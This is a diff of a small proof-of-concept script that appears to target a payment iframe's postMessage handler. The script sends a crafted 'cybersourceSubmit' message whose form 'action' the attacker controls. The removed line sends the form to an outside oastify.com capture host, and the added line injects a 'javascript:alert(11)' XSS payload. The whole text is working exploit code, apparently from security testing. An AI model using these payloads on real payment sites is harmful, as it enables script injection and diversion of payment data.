@@ -11,7 +11,7 @@ document.getElementById('f').addEventListener('load', ()=>{ log('iframe loaded')
   document.getElementById('f').contentWindow.postMessage({type:'init',props:{paymentType:'credit',themeColor:'#ff5722',resEnLang:'en'}}, '*');
   log('sent init');
   setTimeout(()=>{
-    document.getElementById('f').contentWindow.postMessage({type:'cybersourceSubmit',props:{cybersourcePayFromData:{action:'https://vlklprpjtd23myqlmvjzq20qyh48s0ood.oastify.com/poc',data:{access_key:'AK',profile_id:'PF',merchant_id:'MID',transaction_uuid:'TU',signed_field_names:'a,b',unsigned_field_names:'c',signed_date_time:'2026-11-07T00:00:00Z',locale:'en',transaction_type:'sale',reference_number:'REF1',amount:'1.00',currency:'USD',payment_method:'card',bill_to_forename:'T',bill_to_surname:'U',bill_to_email:'t@example.com',merchant_defined_data5:'web'}}}}, '*');
+    document.getElementById('f').contentWindow.postMessage({type:'cybersourceSubmit',props:{cybersourcePayFromData:{action:'javascript:alert(11)',data:{access_key:'AK',profile_id:'PF',merchant_id:'MID',transaction_uuid:'TU',signed_field_names:'a,b',unsigned_field_names:'c',signed_date_time:'2026-11-07T00:00:00Z',locale:'en',transaction_type:'sale',reference_number:'REF1',amount:'1.00',currency:'USD',payment_method:'card',bill_to_forename:'T',bill_to_surname:'U',bill_to_email:'t@example.com',merchant_defined_data5:'web'}}}}, '*');
     log('sent cybersourceSubmit');
   }, 1500);
 }, 1000); });
